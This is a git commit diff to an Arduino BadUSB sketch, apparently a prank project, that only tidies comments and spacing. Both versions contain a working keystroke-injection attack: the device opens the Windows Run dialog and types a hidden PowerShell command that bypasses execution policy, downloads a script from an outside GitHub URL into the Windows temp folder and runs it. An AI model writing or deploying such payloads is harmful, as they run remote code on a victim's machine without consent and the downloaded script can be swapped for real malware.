e6f2bb70905399551a70f9526d48ac0a9d2631ea
CyberSpooon <137320651+CyberSpooon@users.noreply.github.com>
2025-04-01 13:51:29 -0400

    Update BadUSBScript.ino
    formatting changes

--- BadUSBScript.ino
+++ BadUSBScript.ino
@@ -1,25 +1,21 @@
 #include <Keyboard.h>
-
 void setup() {
-  delay(3000); // Wait 3 seconds for the OS to recognize the device
-
+  delay(3000);
   // Press Windows + R
-  Keyboard.press(KEY_LEFT_GUI);  // Windows key
+  Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   delay(200);
   Keyboard.releaseAll();
-
-  delay(500); // Wait for Run dialog to appear
-
-  // Type your command (e.g., "notepad")
+  // Wait for run window
+  delay(500);
+  // Type command
   Keyboard.print(
     "PowerShell.exe -WindowStyle Hidden Set-ExecutionPolicy Bypass -scope Process -Force; & iwr -uri 'https://raw.githubusercontent.com/CyberSpooon/GetRicked/main/scheduletherickoning.ps1' -o 'C:\\Windows\\Temp\\sch.ps1'; & 'C:\\Windows\\Temp\\sch.ps1'"
-    );
+  );
   delay(900);
-  Keyboard.press(KEY_RETURN);  // Press Enter
+  // Press Enter
+  Keyboard.press(KEY_RETURN);  
   Keyboard.release(KEY_RETURN);
 }
-
 void loop() {
-  // Do nothing
 }
